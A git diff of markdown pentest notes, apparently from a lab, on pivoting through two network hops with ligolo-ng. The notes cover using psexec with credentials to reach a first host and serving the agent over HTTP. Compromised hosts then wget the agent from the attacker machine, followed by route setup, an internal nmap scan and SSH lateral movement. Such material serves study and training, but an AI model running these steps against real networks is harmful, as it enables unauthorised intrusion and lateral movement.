@@ -19,17 +19,21 @@ Multi-hops are made easier with ligolo compared to imo proxy chains or ssh port 
 
 Through the First Hop Ი︵𐑼 -> I can access the Second Hop Ი︵𐑼 Ი︵𐑼 -> Through the second hop, I can access other addresses in the subnet 
 
+Ligolo-ng Usable cases -> else  use `proxychains` if only have SOCKS proxy & no routed tunnel
+- the agent running
+- a stable tunnel
+- working routes to the target subnet
+- permission to use a TUN-based routed setup in your environment
+
 ### Setup Ligolo
 
-```
+```bash
 ip tuntap add user root mode tun ligolo  
 ip link set ligolo up
 ```
 
-
-- running server on port 80 to pass ligolo agent executable to target-machine-137
-kali:
-```
+kali: running server on port 80 to pass ligolo agent executable to target-machine-137
+```bash
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -37,7 +41,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ### First hop to internal subnet! 
 
 connect to target-machine-137 to use as first hop!
-```
+```bash
 └─$ impacket-psexec domain/username:'password'@192.168.111.137
 
 # download ligolo agent onto target-machine-137
@@ -49,7 +53,7 @@ time="time-shown-here" level=info msg="Connection established" addr="192.168.xx.
 ```
 
 kali: 
-```
+```bash
 ┌──(root㉿kali)-[/opt/ligolo-ng]
 └─# ./proxy -selfcert 
 INFO[0000] Loading configuration file ligolo-ng.yaml    
@@ -93,7 +97,7 @@ ligolo-ng » session
 
 ```
 
-```
+```bash
 # to delete route
 sudo ip route del 192.168.xxx.0/24
 
@@ -101,7 +105,7 @@ sudo ip route del 192.168.xxx.0/24
 sudo ip route replace 192.168.xxx.0/24
 ```
 
-```
+```bash
 └─$ sudo ip route add 10.10.111.0/24 dev ligolo
 
 └─$ ip route
@@ -111,20 +115,20 @@ sudo ip route replace 192.168.xxx.0/24
 ```
 
  check  if it worked
-```
+```bash
 └─$ nmap -v -n 10.10.111.0/24 -T4 --unprivilege
 ```
 
 ### Second hop for lateral movement within subnet! 
 
 Add another ligolo :) 
-```
+```bash
 └─$ sudo ip tuntap add user root mode tun ligolo1
 └─$ sudo ip link set ligolo1 up           
 ```
 
 use credentials to login to the subnet
-```
+```bash
 └─$ ssh username@10.10.111.13     
 
 $ wget http://192.168.xx.xxx/ligolo-ng_agent_lin
@@ -136,12 +140,12 @@ INFO[0000] Connection established                        addr="192.168.xx.xxx:11
 ```
 
 kali: 
-```
+```bash
 [Agent : username@hostname] » start --tun ligolo1
 INFO[1702] Starting tunnel to username@hostname (xxxxxxxxxxx) 
 ```
 
-```
+```bash
 └─$ ip route
 ...
 10.10.111.0/24 dev ligolo scope link 
@@ -149,12 +153,12 @@ INFO[1702] Starting tunnel to username@hostname (xxxxxxxxxxx)
 ...
 ```
 
-```
+```bash
 └─$ sudo ip route add 10.20.111.0/24 dev ligolo1
 ```
 
 test the hop on a different address in the subnet 
-```
+```bash
 └─$ ping 10.20.111.14
 PING 10.20.111.14 (10.20.111.14) 56(84) bytes of data.
 ```
